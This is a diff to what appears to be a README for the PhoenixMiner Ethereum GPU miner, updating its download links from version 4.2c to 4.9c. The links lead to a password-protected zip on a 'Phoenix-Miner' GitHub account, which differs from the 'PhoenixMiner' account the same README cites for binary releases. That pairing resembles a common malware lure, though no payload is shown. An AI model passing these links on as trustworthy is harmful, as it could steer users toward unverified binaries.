@@ -62,7 +62,7 @@
 ## Download
 
 <p>
-<a href="https://github.com/Phoenix-Miner/PhoenixMiner/releases/download/4.2c/PhoenixMiner_4.2c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
+<a href="https://github.com/Phoenix-Miner/PhoenixMiner/releases/download/4.9c/PhoenixMiner_4.9c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
 <img src="https://github.com/Phoenix-Miner/PhoenixMiner/blob/master/files/git-files/downlaod.png?raw=true" width="300" ></a></p>
 
 * Binary releases: https://github.com/PhoenixMiner/PhoenixMiner/releases
@@ -72,7 +72,7 @@
 ## How to use
 
 <li>Step 1 -  Install your GPUs and set up your computer</li>
-<li>Step 2 -  <a href="https://github.com/Phoenix-Miner/PhoenixMiner/releases/download/4.2c/PhoenixMiner_4.2c_Windows.Password-phoenix.zip">Download latest PhoenixMiner</a></li>
+<li>Step 2 -  <a href="https://github.com/Phoenix-Miner/PhoenixMiner/releases/download/4.9c/PhoenixMiner_4.9c_Windows.Password-phoenix.zip">Download latest PhoenixMiner</a></li>
 <li>Step 3 -  Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
 <li>Step 4 -  Join a mining pool
 <li>Step 5 -  Start mining!</li>
